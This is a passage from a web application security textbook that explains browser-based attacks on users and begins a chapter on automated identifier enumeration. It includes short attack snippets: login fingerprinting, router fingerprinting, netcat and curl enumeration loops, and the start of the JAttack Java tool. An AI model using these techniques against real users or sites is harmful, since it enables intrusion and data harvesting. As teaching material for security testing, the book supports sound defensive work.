attacks, malicious code running in a child frame can grab the focus from the toplevel window, since this operation is not prevented by the same-origin policy. The 
malicious code can capture keystrokes by handling onkeydown events and can 
pass the separate onkeypress events to the top-level window. That way, typed 
text still appears in the top-level window in the normal way. By relinquishing the 
focus briefl y during pauses in typing, the malicious code can even maintain the 
appearance of a blinking caret in the normal location within the top-level page.
Stealing Browser History and Search Queries
JavaScript can be used to perform a brute-force exercise to discover third-party 
sites recently visited by the user and queries he has performed on popular search 
engines. This technique was already described in the context of performing a 
brute-force attack to identify valid anti-CSRF tokens that are in use on a different domain. The attack works by dynamically creating hyperlinks for common 
websites and search queries and by using the getComputedStyle API to test 
whether the link is colorized as visited or not visited. A huge list of possible 
targets can be quickly checked with minimal impact on the user.
Enumerating Currently Used Applications
JavaScript can be used to determine whether the user is presently logged in to 
third-party web applications. Most applications contain protected pages that 
can be viewed only by logged-in users, such as a My Details page. If an unauthenticated user requests the page, she receives different content, such as an 
error message or a redirection to the login.
This behavior can be leveraged to determine whether a user is logged in to a 
third-party application by performing a cross-domain script include for a protected page and implementing a custom error handler to process scripting errors:
window.onerror = fingerprint;
<script src=‚Äùhttps://other-app.com/MyDetails.aspx‚Äù></script>
c13.indd 560 c13.indd 560 8/19/2011 12:14:04 PM 8/19/2011 12:14:04 PM
Stuttard c13.indd V4 - 08/17/2011 Page 561
 Chapter 13 n Attacking Users: Other Techniques 561
Of course, whatever state the protected page is in, it contains only HTML, 
so a JavaScript error is thrown. Crucially, the error contains a different line 
number and error type, depending on the exact HTML document returned. 
The attacker can implement an error handler (in the fingerprint function) that 
checks for the line number and error type that arise when the user is logged 
in. Despite the same-origin restrictions, the attacker‚Äôs script can deduce what 
state the protected page is in.
Having determined which popular third-party applications the user is presently logged in to, the attacker can carry out highly focused cross-site request 
forgery attacks to perform arbitrary actions within those applications in the 
security context of the compromised user.
Port Scanning
JavaScript can be used to perform a port scan of hosts on the user‚Äôs local network or other reachable networks to identify services that may be exploitable. 
If a user is behind a corporate or home fi rewall, an attacker can reach services 
that cannot be accessed from the public Internet. If the attacker scans the client 
computer‚Äôs loopback interface, he may be able to bypass any personal fi rewall 
the user installed.
Browser-based port scanning can use a Java applet to determine the user‚Äôs 
IP address (which may be NATed from the public Internet) and therefore infer 
the likely IP range of the local network. The script can then initiate HTTP connections to arbitrary hosts and ports to test connectivity. As described, the 
same-origin policy prevents the script from processing the responses to these 
requests. However, a trick similar to the one used to detect login status can be 
used to test for network connectivity. Here, the attacker‚Äôs script attempts to 
dynamically load and execute a script from each targeted host and port. If a web 
server is running on that port, it returns HTML or some other content, resulting in a JavaScript error that the port-scanning script can detect. Otherwise, 
the connection attempt times out or returns no data, in which case no error is 
thrown. Hence, despite the same-origin restrictions, the port-scanning script 
can confi rm connectivity to arbitrary hosts and ports.
Note that most browsers implement restrictions on the ports that can be 
accessed using HTTP requests, and that ports commonly used by other wellknown services, such as port 25 for SMTP, are blocked. Historically, however, 
bugs have existed in browsers that have enabled this restriction to sometimes 
be circumvented.
Attacking Other Network Hosts
Following a successful port scan to identify other hosts, a malicious script can 
attempt to fi ngerprint each discovered service and then attack it in various ways. 
c13.indd 561 c13.indd 561 8/19/2011 12:14:05 PM 8/19/2011 12:14:05 PM
Stuttard c13.indd V4 - 08/17/2011 Page 562
562 Chapter 13 n Attacking Users: Other Techniques
Many web servers contain image fi les located at unique URLs. The following 
code checks for a specifi c image associated with a popular range of DSL routers:
<img src=‚Äùhttp://192.168.1.1/hm_icon.gif‚Äù onerror=‚ÄùnotNetgear()‚Äù>
If the function notNetgear is not invoked, the server has been successfully 
fi ngerprinted as a NETGEAR router. The script can then proceed to attack the 
web server, either by exploiting any known vulnerabilities in the particular 
software or by performing a request forgery attack. In this example, the attacker 
could attempt to log in to the router with default credentials and reconfi gure 
the router to open additional ports on its external interface, or expose its administrative function to the world. Note that many highly effective attacks of this 
kind require only the ability to issue arbitrary requests, not to process their 
responses, so they are unaffected by the same-origin policy.
In certain situations, an attacker may be able to leverage DNS rebinding techniques to violate the same-origin policy and actually retrieve content from web 
servers on the local network. These attacks are described later in this chapter.
Exploiting Non-HTTP Services
Going beyond attacks against web servers, in some situations it is possible to 
leverage a user‚Äôs browser to target non-HTTP services that are accessible from 
the user‚Äôs machine. Provided that the service in question tolerates the HTTP 
headers that unavoidably come at the start of each request, an attacker can send 
arbitrary binary content within the message body to interact with the non-HTTP 
service. Many network services do in fact tolerate unrecognized input and still 
process subsequent input that is well-formed for the protocol in question.
One technique for sending an arbitrary message body cross-domain was 
described in Chapter 12, in which an HTML form with the enctype attribute set 
to text/plain was used to send XML content to a vulnerable application. Other 
techniques for delivering these attacks are described in the following paper:
www.ngssoftware.com/research/papers/InterProtocolExploitation.pdf
Such interprotocol attacks may be used to perform unauthorized actions on 
the destination service or to exploit code-level vulnerabilities within that service 
to compromise the targeted server.
Furthermore, in some situations, behavior in non-HTTP services may actually 
be exploitable to perform XSS attacks against web applications running on the 
same server. Such an attack requires the following conditions to be met:
n The non-HTTP service must be running on a port that is not blocked by 
browsers, as described previously.
n The non-HTTP service must tolerate unexpected HTTP headers sent by 
the browser, and not just shut down the network connection when this 
happens. The former is common for many services, particularly those 
that are text-based.
c13.indd 562 c13.indd 562 8/19/2011 12:14:05 PM 8/19/2011 12:14:05 PM
Stuttard c13.indd V4 - 08/17/2011 Page 563
 Chapter 13 n Attacking Users: Other Techniques 563
n The non-HTTP service must echo part of the request contents in its response, 
such as in an error message.
n The browser must tolerate responses that do not contain valid HTTP 
headers, and in this situation must process a portion of the response as 
HTML if that is what it contains. This is in fact how all current browsers 
behave when suitable non-HTTP responses are received, probably for 
backward-compatibility purposes.
n The browser must ignore the port number when segregating cross-origin 
access to cookies. Current browsers are indeed port-agnostic in their 
handling of cookies.
Given these conditions, an attacker can construct an XSS attack targeting the 
non-HTTP service. The attack involves sending a crafted request, in the URL 
or message body, in the normal way. Script code contained in the requests is 
echoed and executes in the user‚Äôs browser. This code can read the user‚Äôs cookies for the domain on which the non-HTTP service resides, and transmit these 
to the attacker.
Exploiting Browser Bugs
If bugs exist within the user‚Äôs browser software or any installed extensions, an 
attacker may be able to exploit these via malicious JavaScript or HTML. In some 
cases, bugs within extensions such as the Java VM have enabled attackers to 
perform two-way binary communication with non-HTTP services on the local 
computer or elsewhere. This enables the attacker to exploit vulnerabilities that 
exist within other services identifi ed via port scanning. Many software products (including non-browser-based products) install ActiveX controls that may 
contain vulnerabilities.
DNS Rebinding
DNS rebinding is a technique that can be used to perform a partial breach of 
same-origin restrictions in some situations, enabling a malicious website to 
interact with a different domain. The possibility of this attack arises because the 
segregations in the same-origin policy are based primarily on domain names, 
whereas the ultimate delivery of HTTP requests involves converting domain 
names into IP addresses.
At a high level, the attack works as follows:
n The user visits a malicious web page on the attacker‚Äôs domain. To retrieve 
this page, the user‚Äôs browser resolves the attacker‚Äôs domain name to the 
attacker‚Äôs IP address.
n The attacker‚Äôs web page makes Ajax requests back to the attacker‚Äôs domain, 
which is allowed by the same-origin policy. The attacker uses DNS rebinding 
c13.indd 563 c13.indd 563 8/19/2011 12:14:05 PM 8/19/2011 12:14:05 PM
Stuttard c13.indd V4 - 08/17/2011 Page 564
564 Chapter 13 n Attacking Users: Other Techniques
to cause the browser to resolve the attacker‚Äôs domain a second time, and 
this time the domain name resolves to the IP address of a third-party 
application, which the attacker is targeting.
n Subsequent requests to the attacker‚Äôs domain name are sent to the targeted application. Since these are on the same domain as the attacker‚Äôs 
original page, the same-origin policy allows the attacker‚Äôs script to 
retrieve the contents of the responses from the targeted application 
and send these back to the attacker, possibly on a different attackercontrolled domain.
This attack faces various obstacles, including mechanisms in some browsers 
to continue using a previously resolved IP address, even if the domain has been 
rebound to a different address. Furthermore, the Host header sent by the browser 
usually still refers to the attacker‚Äôs domain, not that of the target application, 
which may cause problems. Historically, methods have existed by which these 
obstacles can be circumvented on different browsers. In addition to the browser, 
DNS rebinding attacks may be performed against browser extensions and web 
proxies, all of which may behave in different ways.
Note that in DNS rebinding attacks, requests to the targeted application are 
still made in the context of the attacker‚Äôs domain, as far as the browser is concerned. Hence, any cookies for the actual domain of the target application are 
not included in these requests. For this reason, the content that can be retrieved 
from the target via DNS rebinding is the same as could be retrieved by anyone 
who can make direct requests to the target. The technique is primarily of interest, 
therefore, where other controls are in place to prevent an attacker from directly 
interacting with the target. For example, a user residing on an organization‚Äôs 
internal networks, which cannot be reached directly from the Internet, can be 
made to retrieve content from other systems on those networks and transit this 
content to the attacker.
Browser Exploitation Frameworks
Various frameworks have been developed to demonstrate and exploit the variety 
of possible attacks that may be carried out against end users on the Internet. 
These typically require a JavaScript hook to be placed into the victim‚Äôs browser 
via some vulnerability such as XSS. Once the hook is in place, the browser 
contacts a server controlled by the attacker. It may poll this server periodically, 
submitting data back to the attacker and providing a control channel for receiving commands from the attacker.
c13.indd 564 c13.indd 564 8/19/2011 12:14:05 PM 8/19/2011 12:14:05 PM
Stuttard c13.indd V4 - 08/17/2011 Page 565
 Chapter 13 n Attacking Users: Other Techniques 565
NOTE Despite the restrictions imposed by the same-origin policy, various 
techniques can be used in this situation to allow two-way asynchronous interaction with the attacker‚Äôs server from a script that has been injected into a target 
application. One simple method is to perform dynamic cross-domain script 
includes to the attacker‚Äôs domain. These requests can both transmit captured 
data back to the attacker (within the URL query string) and receive instructions 
about actions that should be performed (within the returned script code).
Here are some actions that may be carried out within this type of framework:
n Logging keystrokes and sending these to the attacker
n Hijacking the user‚Äôs session with the vulnerable application
n Fingerprinting the victim‚Äôs browser and exploiting known browser vulnerabilities accordingly
n Performing port scans of other hosts (which may be on a private network 
accessible by the compromised user browser) and sending the results to 
the attacker
n Attacking other web applications accessible via the compromised user‚Äôs 
browser by forcing the browser to send malicious requests
n Brute-forcing the user‚Äôs browsing history and sending this to the attacker
One example of a sophisticated browser exploitation framework is BeEF, 
developed by Wade Alcon, which implements the functionality just described. 
Figure 13-8 shows BeEF capturing information from a compromised user, 
including computer details, the URL and page content currently displayed, and 
keystrokes entered by the user.
Figure 13-8: Data captured from a compromised user by BeEF
c13.indd 565 c13.indd 565 8/19/2011 12:14:05 PM 8/19/2011 12:14:05 PM
Stuttard c13.indd V4 - 08/17/2011 Page 566
566 Chapter 13 n Attacking Users: Other Techniques
Figure 13-9 shows BeEF performing a port scan of the victim user‚Äôs own 
computer.
Figure 13-9: BeEF performing a port scan of a compromised user‚Äôs computer
Another highly functional browser exploitation framework is XSS Shell, produced by Ferruh Mavituna. It provides a wide range of functions for manipulating 
zombie hosts compromised via XSS, including capturing keystrokes, clipboard 
contents, mouse movements, screenshots, and URL history, as well as the injection of arbitrary JavaScript commands. It also remains resident within the user‚Äôs 
browser if she navigates to other pages within the application.
Man-in-the-Middle Attacks
Earlier chapters described how a suitably positioned attacker can intercept 
sensitive data, such as passwords and session tokens, if an application uses 
unencrypted HTTP communications. What is more surprising is that some 
serious attacks can still be performed even if an application uses HTTPS for 
all sensitive data and the target user always verifi es that HTTPS is being used 
properly.
These attacks involve an ‚Äúactive‚Äù man in the middle. Instead of just passively 
monitoring another user‚Äôs traffi c, this type of attacker also changes some of that 
traffi c on the fl y. Such an attack is more sophisticated, but it can certainly be 
delivered in numerous common situations, including public wireless hotspots 
and shared offi ce networks, and by suitably minded governments.
Many applications use HTTP for nonsensitive content, such as product descriptions and help pages. If such content makes any script includes using absolute 
URLs, an active man-in-the-middle attack can be used to compromise HTTPSprotected requests on the same domain. For example, an application‚Äôs help page 
may contain the following:
<script src=‚Äùhttp://wahh-app.com/help.js‚Äù></script>
c13.indd 566 c13.indd 566 8/19/2011 12:14:05 PM 8/19/2011 12:14:05 PM
Stuttard c13.indd V4 - 08/17/2011 Page 567
 Chapter 13 n Attacking Users: Other Techniques 567
This behavior of using absolute URLs to include scripts over HTTP appears 
in numerous high-profi le applications on the web today. In this situation, an 
active man-in-the-middle attacker could, of course, modify any HTTP response 
to execute arbitrary script code. However, because the same-origin policy generally treats content loaded over HTTP and HTTPS as belonging to different 
origins, this would not enable the attacker to compromise content that is accessed 
using HTTPS.
To overcome this obstacle, the attacker can induce a user to load the same 
page over HTTPS by modifying any HTTP response to cause a redirection or 
by rewriting the targets of links in another response. When the user loads the 
help page over HTTPS, her browser performs the specifi ed script include using 
HTTP. Crucially, some browsers do not display any warnings in this situation. 
The attacker can then return his arbitrary script code in the response for the 
included script. This script executes in the context of the HTTPS response, 
allowing the attacker to compromise this and further content that is accessed 
over HTTPS.
Suppose that the application being targeted does not use plain HTTP for any 
content. An attacker can still induce the user to make requests to the target 
domain using plain HTTP by returning a redirection from an HTTP request 
made to any other domain. Although the application itself may not even listen 
for HTTP requests on port 80, the attacker can intercept these induced requests 
and return arbitrary content in response to them. In this situation, various 
techniques can be used to escalate the compromise into the HTTPS origin for 
the application‚Äôs domain:
n First, as was described for cookie injection attacks, the attacker can use a 
response over plain HTTP to set or update a cookie value that is used in 
HTTPS requests. This can be done even for cookies that were originally 
set over HTTPS and fl agged as secure. If any cookie values are processed 
in an unsafe way by script code running in the HTTPS origin, a cookie 
injection attack can be used to deliver an XSS exploit via the cookie.
n Second, as mentioned, some browser extensions do not properly segregate 
content loaded over HTTP and HTTPS and effectively treat this as belonging to a single origin. The attacker‚Äôs script, returned in a response to an 
induced HTTP request, can leverage such an extension to read or write 
the contents of pages that the user accessed using HTTPS.
The attacks just described rely on some method of inducing the user to make an 
arbitrary HTTP request to the target domain, such as by returning a redirection 
response from an HTTP request that the user makes to any other domain. You 
might think that a security-paranoid user would be safe from this technique. 
Suppose the user accesses only one website at a time and restarts his browser 
before accessing each new site. Suppose he logs in to his banking application, 
c13.indd 567 c13.indd 567 8/19/2011 12:14:05 PM 8/19/2011 12:14:05 PM
Stuttard c13.indd V4 - 08/17/2011 Page 568
568 Chapter 13 n Attacking Users: Other Techniques
which uses pure HTTPS, from a clean new browser. Can he be compromised 
by an active man-in-the-middle attack?
The disturbing answer is that yes, he probably can be compromised. Today‚Äôs 
browsers make numerous plain HTTP requests in the background, regardless 
of which domains the user visits. Common examples include antiphishing lists, 
version pings, and requests for RSS feeds. An attacker can respond to any of 
these requests with a redirection to the targeted domain using HTTP. When the 
browser silently follows the redirection, one of the attacks already described 
can be delivered, fi rst to compromise the HTTP origin for the targeted domain, 
and then to escalate this compromise into the HTTPS origin.
Security-paranoid users who need to access sensitive HTTPS-protected content 
via an untrusted network can (probably) prevent the technique just described 
by setting their browser‚Äôs proxy confi guration to use an invalid local port for all 
protocols other than HTTPS. Even if they do this, they may still need to worry 
about active attacks against SSL, a topic that is outside the scope of this book.
Summary
We have examined a huge variety of ways in which defects in a web application 
may leave its users exposed to malicious attack. Many of these vulnerabilities 
are complex to understand and discover and often necessitate an amount of 
investigative effort that exceeds their signifi cance as the basis for a worthwhile 
attack. Nevertheless, it is common to fi nd that lurking among a large number 
of uninteresting client-side fl aws is a serious vulnerability that can be leveraged 
to attack the application itself. In many cases, the effort is worth it.
Furthermore, as awareness of web application security continues to evolve, 
direct attacks against the server component itself are likely to become less 
straightforward to discover and execute. Attacks against other users, for better 
or worse, are certainly part of everyone‚Äôs future.
Questions
Answers can be found at http://mdsec.net/wahh.
 1. You discover an application function where the contents of a query string 
parameter are inserted into the Location header in an HTTP redirect. What 
three different types of attacks can this behavior potentially be exploited 
to perform?
 2. What main precondition must exist to enable a CSRF attack against a 
sensitive function of an application?
 3. What three defensive measures can be used to prevent JavaScript hijacking attacks?
c13.indd 568 c13.indd 568 8/19/2011 12:14:05 PM 8/19/2011 12:14:05 PM
Stuttard c13.indd V4 - 08/17/2011 Page 569
 Chapter 13 n Attacking Users: Other Techniques 569
 4. For each of the following technologies, identify the circumstances, if any, 
in which the technology would request /crossdomain.xml to properly 
enforce domain segregation:
(a) Flash
(b) Java
(c) HTML5
(d) Silverlight
 5. ‚ÄúWe‚Äôre safe from clickjacking attacks because we don‚Äôt use frames.‚Äù What, 
if anything, is wrong with this statement?
 6. You identify a persistent XSS vulnerability within the display name caption used by an application. This string is only ever displayed to the user 
who confi gured it, when they are logged in to the application. Describe 
the steps that an attack would need to perform to compromise another 
user of the application. 
 7. How would you test whether an application allows cross-domain requests 
using XMLHttpRequest?
 8. Describe three ways in which an attacker might induce a victim to use an 
arbitrary cookie.
c13.indd 569 c13.indd 569 8/19/2011 12:14:05 PM 8/19/2011 12:14:05 PM
Stuttard c13.indd V4 - 08/17/2011 Page 570
c13.indd 570 c13.indd 570 8/19/2011 12:14:06 PM 8/19/2011 12:14:06 PM
Stuttard c14.indd V3 - 08/11/2011 Page 571
571
C H A P T E R 
14
Automating Customized Attacks
This chapter does not introduce any new categories of vulnerabilities. Rather, it 
examines one key element in an effective methodology for hacking web applications ‚Äî the use of automation to strengthen and accelerate customized attacks. 
The range of techniques involved can be applied throughout the application and 
to every stage of the attack process, from initial mapping to actual exploitation.
Every web application is different. Attacking an application effectively involves 
using various manual procedures and techniques to understand its behavior 
and probe for vulnerabilities. It also entails bringing to bear your experience 
and intuition in an imaginative way. Attacks typically are customized in nature, 
tailored to the particular behavior you have identifi ed and to the specifi c ways in 
which the application enables you to interact with and manipulate it. Performing 
customized attacks manually can be extremely laborious and is prone to mistakes. 
The most successful web application hackers take their customized attacks a 
step further and fi nd ways to automate them to make them easier, faster, and 
more effective.
This chapter describes a proven methodology for automating customized 
attacks. This methodology combines the virtues of human intelligence and 
computerized brute force, usually with devastating results. This chapter also 
examines various potential obstacles that may hinder the use of automation, 
and ways in which these obstacles can be circumvented.
c14.indd 571 c14.indd 571 8/19/2011 12:15:20 PM 8/19/2011 12:15:20 PM
Stuttard c14.indd V3 - 08/11/2011 Page 572
572 Chapter 14 n Automating Customized Attacks
Uses for Customized Automation
There are three main situations in which customized automated techniques 
can be employed to help you attack a web application:
n Enumerating identifi ers ‚Äî Most applications use various kinds of names 
and identifi ers to refer to individual items of data and resources, such as 
account numbers, usernames, and document IDs. You often will need 
to iterate through a large number of potential identifi ers to enumerate 
which ones are valid or worthy of further investigation. In this situation, 
you can use automation in a fully customized way to work through a list 
of possible identifi ers or cycle through the syntactic range of identifi ers 
believed to be in use by the application.
An example of an attack to enumerate identifi ers would be where an 
application uses a page number parameter to retrieve specifi c content:
http://mdsec.net/app/ShowPage.ashx?PageNo=10069
In the course of browsing through the application, you discover a large 
number of valid PageNo values. But to identify every valid value, you 
need to cycle through the entire range ‚Äî something you cannot feasibly 
do manually.
n Harvesting data ‚Äî Many kinds of web application vulnerabilities enable 
you to extract useful or sensitive data from the application using specifi c 
crafted requests. For example, a personal profi le page may display the 
personal and banking details of the current user and indicate that user‚Äôs 
privilege level within the application. Through an access control defect, 
you may be able to view the personal profi le page of any application 
user ‚Äî but only one user at a time. Harvesting this data for every user 
might require thousands of individual requests. Rather than working 
manually, you can use a customized automated attack to quickly capture 
all this data in a useful form.
An example of harvesting useful data would be to extend the enumeration 
attack just described. Instead of simply confi rming which PageNo values 
are valid, your automated attack could extract the contents of the HTML 
title tag from each page it retrieves, enabling you to quickly scan the list 
of pages for those that are most interesting.
n Web application fuzzing ‚Äî As we have described the practical steps for 
detecting common web application vulnerabilities, you have seen numerous examples where the best approach to detection is to submit various 
c14.indd 572 c14.indd 572 8/19/2011 12:15:21 PM 8/19/2011 12:15:21 PM
Stuttard c14.indd V3 - 08/11/2011 Page 573
 Chapter 14 n Automating Customized Attacks 573
unexpected items of data and attack strings and review the application‚Äôs 
responses for any anomalies that indicate that the fl aw may be present. In 
a large application, your initial mapping exercises may identify dozens of 
distinct requests you need to probe, each containing numerous different 
parameters. Testing each case manually would be time-consuming and 
mind-numbing and could leave a large part of the attack surface neglected. 
Using customized automation, however, you can quickly generate huge 
numbers of requests containing common attack strings and quickly assess 
the server‚Äôs responses to hone in on interesting cases that merit further 
investigation. This technique is often called fuzzing.
We will examine in detail each of these three situations and the ways in 
which customized automated techniques can be leveraged to vastly enhance 
your attacks against an application.
Enumerating Valid Identifi ers
As we have described various common vulnerabilities and attack techniques, 
you have encountered numerous situations in which the application employs 
a name or identifi er for some item, and your task as an attacker is to discover 
some or all of the valid identifi ers in use. Here are some examples of where this 
requirement can arise:
n The application‚Äôs login function returns informative messages that disclose whether a failed login was the result of an unrecognized username 
or incorrect password. By iterating through a list of common usernames 
and attempting to log in using each one, you can narrow down the list 
to those that you know to be valid. This list can then be used as the basis 
for a password-guessing attack.
n Many applications use identifi ers to refer to individual resources that are 
processed within the application, such as document IDs, account numbers, 
employee numbers, and log entries. Often, the application exposes some 
means of confi rming whether a specifi c identifi er is valid. By iterating 
through the syntactic range of identifi ers in use, you can obtain a comprehensive list of all these resources.
n If the session tokens generated by the application can be predicted, you 
may be able to hijack other users‚Äô sessions simply by extrapolating from a 
series of tokens issued to you. Depending on the reliability of this process, 
you may need to test a large number of candidate tokens for each valid 
value that is confi rmed.
c14.indd 573 c14.indd 573 8/19/2011 12:15:21 PM 8/19/2011 12:15:21 PM
Stuttard c14.indd V3 - 08/11/2011 Page 574
574 Chapter 14 n Automating Customized Attacks
The Basic Approach
Your fi rst task in formulating a customized automated attack to enumerate 
valid identifi ers is to locate a request/response pair that has the following 
characteristics:
n The request includes a parameter containing the identifi er you are targeting. For example, in a function that displays an application page, the 
request might contain the parameter PageNo=10069.
n The server‚Äôs response to this request varies in a systematic way when you 
vary the parameter‚Äôs value. For example, if a valid PageNo is requested, 
the server might return a response containing the specifi ed document‚Äôs 
contents. If an invalid value is requested, it might return a generic error 
message.
Having located a suitable request/response pair, the basic approach involves 
submitting a large number of automated requests to the application, either working through a list of potential identifi ers, or iterating through the syntactic range 
of identifi ers known to be in use. The application‚Äôs responses to these requests 
are monitored for ‚Äúhits,‚Äù indicating that a valid identifi er was submitted.
Detecting Hits
There are numerous attributes of responses in which systematic variations may 
be detected, and which may therefore provide the basis for an automated attack.
HTTP Status Code
Many applications return different status codes in a systematic way, depending on the values of submitted parameters. The values that are most commonly 
encountered during an attack to enumerate identifi ers are as follows:
n 200 ‚Äî The default status code, meaning ‚ÄúOK.‚Äù
n 301 or 302 ‚Äî A redirection to a different URL.
n 401 or 403 ‚Äî The request was not authorized or allowed.
n 404 ‚Äî The requested resource was not found.
n 500 ‚Äî The server encountered an error when processing the request.
Response Length
It is common for dynamic application pages to construct responses using a page 
template (which has a fi xed length) and to insert per-response content into this 
template. If the per-response content does not exist or is invalid (such as if an 
incorrect document ID was requested), the application might simply return an 
c14.indd 574 c14.indd 574 8/19/2011 12:15:21 PM 8/19/2011 12:15:21 PM
Stuttard c14.indd V3 - 08/11/2011 Page 575
 Chapter 14 n Automating Customized Attacks 575
empty template. In this situation, the response length is a reliable indicator of 
whether a valid document ID has been identifi ed.
In other situations, different response lengths may point toward the occurrence of an error or the existence of additional functionality. In the authors‚Äô 
experience, the HTTP status code and response length indicators have been 
found to provide a highly reliable means of identifying anomalous responses 
in the majority of cases.
Response Body
It is common for the data actually returned by the application to contain literal 
strings or patterns that can be used to detect hits. For example, when an invalid 
document ID is requested, the response might contain the string Invalid document ID. In some cases, where the HTTP status code does not vary, and the 
overall response length is changeable due to the inclusion of dynamic content, 
searching responses for a specifi c string or pattern may be the most reliable 
means of identifying hits.
Location Header
In some cases, the application responds to every request for a particular URL 
with an HTTP redirection (a 301 or 302 status code), where the target of the 
redirection depends on the parameters submitted in the request. For example, 
a request to view a report might result in a redirection to /download.jsp if the 
supplied report name is correct, or to /error.jsp if it is incorrect. The target 
of an HTTP redirection is specifi ed in the Location header and can often be 
used to identify hits.
Set-Cookie Header
Occasionally, the application may respond in an identical way to any set of 
parameters, with the exception that a cookie is set in certain cases. For example, 
every login request might be met with the same redirection, but in the case of 
valid credentials, the application sets a cookie containing a session token. The 
content that the client receives when it follows the redirect depends on whether 
a valid session token is submitted.
Time Delays
Occasionally, the actual contents of the server‚Äôs response may be identical when 
valid and invalid parameters are submitted, but the time taken to return the 
response may differ subtly. For example, when an invalid username is submitted 
to a login function, the application may respond immediately with a generic, 
uninformative message. However, when a valid username is submitted, the 
c14.indd 575 c14.indd 575 8/19/2011 12:15:21 PM 8/19/2011 12:15:21 PM
Stuttard c14.indd V3 - 08/11/2011 Page 576
576 Chapter 14 n Automating Customized Attacks
application may perform various back-end processing to validate the supplied 
credentials, some of which is computationally intensive, before returning the 
same message if the credentials are incorrect. If you can detect this time difference remotely, it can be used as a discriminator to identify hits in your attack. 
(This bug is also often found in other types of software, such as older versions 
of OpenSSH.)
TIP The primary objective in selecting indicators of hits is to fi nd one that is 
completely reliable or a group that is reliable when taken together. However, 
in some attacks, you may not know in advance exactly what a hit looks like. 
For example, when targeting a login function to try to enumerate usernames, 
you may not actually possess a known valid username to determine the application‚Äôs behavior in the case of a hit. In this situation, the best approach is to 
monitor the application‚Äôs responses for all the attributes just described and to 
look for any anomalies.
Scripting the Attack
Suppose that you have identifi ed the following URL, which returns a 200 status 
code when a valid PageNo value is submitted and a 500 status code otherwise:
http://mdsec.net/app/ShowPage.ashx?PageNo=10069
This request/response pair satisfi es the two conditions required for you to 
be able to mount an automated attack to enumerate valid page IDs.
In a simple case such as this, it is possible to create a custom script quickly 
to perform an automated attack. For example, the following bash script reads a 
list of potential page IDs from standard input, uses the netcat tool to request a 
URL containing each ID, and logs the fi rst line of the server‚Äôs response, which 
contains the HTTP status code:
#!/bin/bash
server=mdsec.net
port=80
while read id
do
echo -ne ‚Äú$id\t‚Äù
echo -ne ‚ÄúGET/app/ShowPage.ashx?PageNo=$id HTTP/1.0\r\nHost: $server\r\n\r\n‚Äù
 | netcat $server $port | head -1
done | tee outputfile
c14.indd 576 c14.indd 576 8/19/2011 12:15:21 PM 8/19/2011 12:15:21 PM
Stuttard c14.indd V3 - 08/11/2011 Page 577
 Chapter 14 n Automating Customized Attacks 577
Running this script with a suitable input fi le generates the following output, 
which enables you to quickly identify valid page IDs:
~> ./script <IDs.txt
10060 HTTP/1.0 500 Internal Server Error
10061 HTTP/1.0 500 Internal Server Error
10062 HTTP/1.0 200 Ok
10063 HTTP/1.0 200 Ok
10064 HTTP/1.0 500 Internal Server Error
...
TIP The Cygwin environment can be used to execute bash scripts on the 
Windows platform. Also, the UnxUtils suite contains Win32 ports of numerous 
useful GNU utilities such as head and grep.
You can achieve the same result just as easily in a Windows batch script. The 
following example uses the curl tool to generate requests and the findstr
command to fi lter the output:
for /f ‚Äútokens=1‚Äù %i in (IDs.txt) do echo %i && curl
 mdsec.net/app/ShowPage.ashx?PageNo=%i -i -s | findstr /B HTTP/1.0
Simple scripts like these are ideal for performing a straightforward task such 
as cycling through a list of parameter values and parsing the server‚Äôs response 
for a single attribute. However, in many situations you are likely to require 
more power and fl exibility than command-line scripting can readily offer. The 
authors‚Äô preference is to use a suitable high-level object-oriented language that 
enables easy manipulation of string-based data and provides accessible APIs 
for using sockets and SSL. Languages that satisfy these criteria include Java, C#, 
and Python. We will look in more depth at an example using Java.
JAttack
JAttack is an example of a simple but versatile tool that demonstrates how anyone 
with some basic programming knowledge can use customized automation to 
deliver powerful attacks against an application. The full source code for this tool 
can be downloaded from this book‚Äôs companion website, http://mdsec.net/
wahh. More important than the actual code, however, are the basic techniques 
involved, which we will explain shortly.
Rather than just working with a request as an unstructured block of text, we 
need a tool to understand the concept of a request parameter. This is a named 
c14.indd 577 c14.indd 577 8/19/2011 12:15:21 PM 8/19/2011 12:15:21 PM
Stuttard c14.indd V3 - 08/11/2011 Page 578
578 Chapter 14 n Automating Customized Attacks
item of data that can be manipulated and that is attached to a request in a particular way. Request parameters may appear in the URL query string, HTTP 
cookies, or the body of a POST request. Let‚Äôs start by creating a Param class to 
hold the relevant details:
// JAttack.java
// by Dafydd Stuttard
import java.net.*;
import java.io.*;
class Param
{
 String name, value;
 Type type;
 boolean attack;
 Param(String name, String value, Type type, boolean attack)
 {
 this.name = name;
 this.value = value;
 this.type = type;
 this.attack = attack;
 }
 enum Type
 {
 URL, COOKIE, BODY
 }
}
In many situations, a request contains parameters that we don‚Äôt want to modify 
in a given attack, but that we still need to include for the attack to succeed. We 
can use the ‚Äúattack‚Äù fi eld to fl ag whether a given parameter is being subjected 
to modifi cation in the current attack.
To modify the value of a selected parameter in crafted ways, we need our tool 
to understand the concept of an attack payload. In different types of attacks, 
we need to create different payload sources. Let‚Äôs build some fl exibility into the 
tool up front and create an interface that all payload sources must implement:
interface PayloadSource
{
 boolean nextPayload();
 void reset();
 String getPayload();
}
The nextPayload method can be used to advance the state of the source; it 
returns true until all its payloads are used up. The reset method returns the 
state to its initial point. The getPayload method returns the value of the current payload.
c14.indd 578 c14.indd 578 8/19/2011 12:15:21 PM 8/19/2011 12:15:21 PM
Stuttard c14.indd V3 - 08/11/2011 Page 579
 Chapter 14 n Automating Customized Attacks 579
In the document enumeration example, the parameter we want to vary contains 
a numeric value, so our fi rst implementation of the PayloadSource interface is 
a class to generate numeric payloads. This class allows us to specify the range 
of numbers we want to test:
class PSNumbers implements PayloadSource
{
 int from, to, step, current;
 PSNumbers(int from, int to, int step)
 {
 this.from = from;
 this.to = to;
 this.step = step;
 reset();
 }
 public boolean nextPayload()
 {
 current += step;
 return current <= to;
 }
 public void reset()
 {
 current = from - step;
 }
 public String getPayload()
 {
 return Integer.toString(current);
 }
}
Equipped with the concept of a request parameter and a payload 
source, we have suffi cient resources to generate actual requests and process 
the server‚Äôs responses. First, let‚Äôs specify some confi guration for our fi rst 
attack:
class JAttack
{
 // attack config
 String host = ‚Äúmdsec.net‚Äù;
 int port = 80;
 String method = ‚ÄúGET‚Äù;
 String url = ‚Äú/app/ShowPage.ashx‚Äù;
 Param[] params = new Param[]
 {
 new Param(‚ÄúPageNo‚Äù, ‚Äú10069‚Äù, Param.Type.URL, true),
 };
 PayloadSource payloads = new PSNumbers(10060, 10080, 1);
